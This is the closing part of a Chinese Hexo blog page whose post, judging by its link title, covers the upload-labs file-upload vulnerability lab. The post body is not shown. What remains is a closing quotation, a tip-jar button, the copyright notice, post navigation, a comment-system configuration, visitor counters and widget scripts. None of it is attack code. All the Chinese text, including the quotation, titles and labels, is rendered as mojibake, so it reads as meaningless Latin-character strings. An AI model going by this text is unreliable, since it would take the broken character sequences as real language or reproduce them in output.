<p>æœ‰æ—¶æƒ³æƒ³ï¼Œç‹¬å±…æ–—å®¤å’Œå¤©æ¶¯æµªè¿¹å¥½åƒæ˜¯ä¸€ä»¶äº‹æƒ…ï¼Œèº«å¤„å¯‚å¯å’Œèº«å¤„å–§åš£å…¶å®ä¹Ÿæ²¡ä»€ä¹ˆä¸¤æ ·ï¼Œèº«å¤–çš„æ•´ä¸ªä¸–ç•Œéƒ½æ˜¯é•œå­ï¼Œæˆ‘ä»¬å¿…é¡»è‡ªå·±è®¤å¾—è‡ªå·±ã€‚<br> â€”â€”é©¬è‰¯ã€Šäººé—´å§åº•ã€‹</p>
</blockquote>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="æ‰“èµ" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me a candy.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg"><img loading="lazy" src="https://gitee.com/m0re/picture/raw/master/img/wechatpay.jpg" alt="å¾®ä¿¡æ”¯ä»˜" title="å¾®ä¿¡æ”¯ä»˜"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>æœ¬æ–‡ä½œè€…ï¼š</strong>m0re</li><li class="post-copyright-link"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="https://m0re.top/posts/1158347a/" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´â€”â€”upload-labsé¶åœºå­¦ä¹ ">https://m0re.top/posts/1158347a/</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é»˜è®¤é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> è®¸å¯åè®®ã€‚</li></ul></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/17b1c101/" rel="prev" title="æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„äº†è§£å’Œåˆæ¬¡å°è¯•"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">æ–‡ä»¶ä¸Šä¼ æ¼æ´çš„äº†è§£å’Œåˆæ¬¡å°è¯•</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/ba5b0432/" rel="next" title="ä»€ä¹ˆæ˜¯å¸ƒå°”ç›²æ³¨ï¼Ÿå­¦åˆ°äº†"><span class="post-nav-text">ä»€ä¹ˆæ˜¯å¸ƒå°”ç›²æ³¨ï¼Ÿå­¦åˆ°äº†</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>å°è¯•ä½¿ç”¨ utterances ï¼ˆåŸºäº GitHub Issuesï¼‰è¯„è®ºç³»ç»Ÿã€‚</span><br><span>æ‚¨å¯ä»¥ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®åˆ‡æ¢å¯¹åº”è¯„è®ºç³»ç»Ÿï¼Œ</span><br><span><script>function showUtterances(){ document.querySelector(".utterances").style.display='block'; document.querySelector('#valine-container').style.display='none'; }function showValine(){ document.querySelector('#valine-container').style.display='block'; document.querySelector(".utterances").style.display='none'; }</script></span><br><span><a class="hty-button hty-button--raised" onclick="showValine()">Valine</a><a class="hty-button hty-button--raised" onclick="showUtterances()">utterances</a></span><br><span><style>.utterances{display:none;}</style></span><br></div><div id="valine-container"></div><script>Yun.utils.getScript("https://cdn.jsdelivr.net/npm/valine@latest/dist/Valine.min.js", () => {
  const valineConfig = {"enable":true,"appId":"gUEA9zKLhCnMFxQI5kI20WiD-gzGzoHsz","appKey":"GQKAp04LNloy3MrDMv86MI3i","placeholder":"è¯„è®ºä¸€ä¸‹~&nbsp_(:Ğ·ã€âˆ )_ ï¼ˆå¡«å†™é‚®ç®±å¯ä»¥æ”¶åˆ°å›å¤é€šçŸ¥ï½ï¼‰","avatar":null,"pageSize":10,"visitor":true,"highlight":true,"recordIP":true,"enableQQ":true,"requiredFields":["nick","mail"],"el":"#valine-container","lang":"zh-cn"}
  valineConfig.path = "/posts/1158347a/"
  new Valine(valineConfig)
}, window.Valine);</script></div></main><footer class="sidebar-translate" id="footer"><div class="beian"><a rel="noopener" href="https://beian.miit.gov.cn/" target="_blank">è±«ICPå¤‡2020025591å·-1</a></div><div class="copyright"><span>&copy; 2020 â€“ 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> m0re</span></div><div class="powered"><span>ç”± <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> é©±åŠ¨ v5.1.0</span><span class="footer-separator">|</span><span>ä¸»é¢˜ - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.6.1</span></div><div class="live_time"><span>æœ¬åšå®¢å·²è‹Ÿå»¶æ®‹å–˜äº†</span><span id="display_live_time"></span><span class="moe-text">(â—'â—¡'â—)</span><script>function blog_live_time() {
  setTimeout(blog_live_time, 1000);
  const start = new Date('2020-02-21T00:00:00');
  const now = new Date();
  const timeDiff = (now.getTime() - start.getTime());
  const msPerMinute = 60 * 1000;
  const msPerHour = 60 * msPerMinute;
  const msPerDay = 24 * msPerHour;
  const passDay = Math.floor(timeDiff / msPerDay);
  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
  display_live_time.innerHTML = " " + passDay + " å¤© " + passHour + " å°æ—¶ " + passMinute + " åˆ† " + passSecond + " ç§’";
}
blog_live_time();
</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="æ€»è®¿å®¢é‡"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="æ€»è®¿é—®é‡"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#6200ee" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="æœç´¢"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
  // Handle and trigger popup window
  document.querySelector(".popup-trigger").addEventListener("click", () => {
    document.querySelector(".popup").classList.add("show");
    setTimeout(() => {
      document.querySelector(".search-input").focus();
    }, 100);
  });

  // Monitor main search box
  const onPopupClose = () => {
    document.querySelector(".popup").classList.remove("show");
  };

  document.querySelector(".popup-btn-close").addEventListener("click", () => {
    onPopupClose();
  });

  window.addEventListener("keyup", event => {
    if (event.key === "Escape") {
      onPopupClose();
    }
  });
});
</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="æœç´¢..." value=""></div><div id="local-search-result"></div></div></div><script src="https://cdn.jsdelivr.net/npm/live2d-widget@^3.1.3/lib/L2Dwidget.min.js"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"https://cdn.jsdelivr.net/npm/live2d-widget-model-wanko@1.0.5/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>